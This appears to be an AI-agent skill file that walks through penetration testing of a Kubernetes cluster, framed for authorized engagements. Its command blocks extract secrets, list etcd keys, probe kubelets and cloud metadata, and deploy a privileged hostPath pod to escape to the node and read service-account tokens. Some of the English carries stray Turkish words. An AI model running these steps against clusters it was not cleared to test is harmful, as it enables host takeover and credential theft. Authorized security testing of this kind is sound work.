---
name: performing-kubernetes-penetration-testing
description: Kubernetes penetration testing systematically evaluates cluster security by simulating attacker techniques against the API server, kubelet, etcd, pods, RBAC, network policies, and secrets.
  Using tools
tags:
- security
- container-security
- offensive-security
- fetih
- cybersecurity
- penetration-testing
- kubernetes
- siber-güvenlik
- containers
triggers:
- api
- authentication
- cloud
- container
- dns
- endpoint
- exploit
- http
- incident
- kubernetes
- log
- network
category: container-security
source_subdomain: container-security
nist_csf:
- PR.PS-01
- PR.IR-01
- ID.AM-08
- DE.CM-01
---

# Performing Kubernetes Penetration Testing


## Genel Bakış

Kubernetes penetration testing systematically evaluates cluster security by simulating attacker techniques against the API server, kubelet, etcd, pods, RBAC, network policies, and secrets. Using tools like kube-hunter, Kubescape, peirates, and manual kubectl exploitation, testers identify misconfigurations that could lead to cluster compromise.


## Ne Zaman Kullanılır

- conducting yaparken security assessments that involve performing kubernetes penetration testing
- following yaparken: incident response procedures for related security events
- performing yaparken scheduled security testing or auditing activities
- validating yaparken security controls through hands-on testing

## Ön Gereksinimler

- Authorized penetration testing engagement
- Kubernetes cluster access (various levels for different test scenarios)
- kube-hunter, kubescape, kube-bench installed
- kubectl configured
- Network Erişim: cluster components

## Core Concepts

### Kubernetes Attack Surface

| Component | Port | Attack Vectors |
|-----------|------|---------------|
| API Server | 6443 | Auth bypass, RBAC abuse, anonymous access |
| Kubelet | 10250/10255 | Unauthenticated access, command execution |
| etcd | 2379/2380 | Unauthenticated read, secret extraction |
| Dashboard | 8443 | Default credentials, token theft |
| NodePort Services | 30000-32767 | Service exposure, application exploits |
| CoreDNS | 53 | DNS spoofing, zone transfer |

### MITRE ATT&CK for Kubernetes

| Phase | Techniques |
|-------|-----------|
| Initial Access | Exposed Dashboard, Kubeconfig theft, Application exploit |
| Execution | exec into container, CronJob, Dağıt: privileged pod |
| Persistence | Backdoor container, mutating webhook, static pod |
| Privilege Escalation | Privileged container, node access, RBAC abuse |
| Defense Evasion | Pod name mimicry, namespace hiding, log deletion |
| Credential Access | Secret extraction, service account token theft |
| Lateral Movement | Container escape, cluster internal services |

## İş Akışı

### Adım 1: External Reconnaissance

```bash
nmap -sV -p 443,6443,8443,2379,10250,10255,30000-32767 target-cluster.com

curl -k https://target-cluster.com:6443/api
curl -k https://target-cluster.com:6443/version

curl -k https://target-cluster.com:6443/api/v1/namespaces

curl -k https://node-ip:10250/pods
curl http://node-ip:10255/pods  # Read-only kubelet
```

### Adım 2: Automated Scanning with kube-hunter

```bash
pip install kube-hunter

kube-hunter --remote target-cluster.com

kube-hunter --internal

kube-hunter --pod

kube-hunter --remote target-cluster.com --report json --log output.json
```

### Adım 3: CIS Benchmark Assessment with kube-bench

```bash
kube-bench run --targets master

kube-bench run --targets node

kube-bench run --targets master --check 1.2.1,1.2.2,1.2.3

kube-bench run --json > kube-bench-results.json

kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs -l app=kube-bench
```

### Adım 4: Framework Compliance with Kubescape

```bash
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

kubescape scan framework nsa

kubescape scan framework mitre

kubescape scan framework cis-v1.23-t1.0.1

kubescape scan framework nsa --namespace production

kubescape scan framework nsa --format json --output kubescape-report.json
```

### Adım 5: RBAC Exploitation Testing

```bash
kubectl auth can-i --list

kubectl auth can-i create pods
kubectl auth can-i create pods --subresource=exec
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings
kubectl auth can-i '*' '*'  # cluster-admin check

kubectl get serviceaccounts -A
kubectl get secrets -A -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {name: .metadata.name, namespace: .metadata.namespace}'

kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name=="system:anonymous" or .subjects[]?.name=="system:unauthenticated")'

kubectl --as=system:serviceaccount:default:default get pods
```

### Adım 6: Secret Extraction Testing

```bash
kubectl get secrets -A

kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d

kubectl get pods -A -o json | jq '.items[].spec.containers[].env[]? | select(.valueFrom.secretKeyRef)'

kubectl get pods -A -o json | jq '.items[].spec.volumes[]? | select(.secret)'

ETCDCTL_API=3 etcdctl --endpoints=https://etcd-ip:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only
```

### Adım 7: Pod Exploitation

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pentest-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: pentest
    image: ubuntu:22.04
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

kubectl exec -it pentest-pod -- bash

chroot /host

curl -k https://kubernetes.default.svc/api/v1/namespaces
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Adım 8: Network Policy Testing

```bash
kubectl get networkpolicies -A

kubectl run test-netpol --image=busybox --restart=Never -- wget -qO- --timeout=2 http://target-service.namespace.svc

kubectl run test-egress --image=busybox --restart=Never -- wget -qO- --timeout=2 http://example.com

kubectl run test-metadata --image=busybox --restart=Never -- wget -qO- --timeout=2 http://169.254.169.254/latest/meta-data/
```

## Doğrulama Commands

```bash
kube-hunter --remote $CLUSTER_IP --report json

kubescape scan framework nsa --format json

kube-bench run --targets master,node --json

kubectl delete pod pentest-pod
kubectl delete pod test-netpol test-egress test-metadata
```

## References

- [kube-hunter - Kubernetes Penetration Testing](https://github.com/aquasecurity/kube-hunter)
- [Kubescape - Kubernetes Security Platform](https://github.com/kubescape/kubescape)
- [kube-bench - CIS Benchmark](https://github.com/aquasecurity/kube-bench)
- [MITRE ATT&CK Containers Matrix](https://attack.mitre.org/matrices/enterprise/containers/)
- [Kubernetes Threat Matrix - Microsoft](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/)
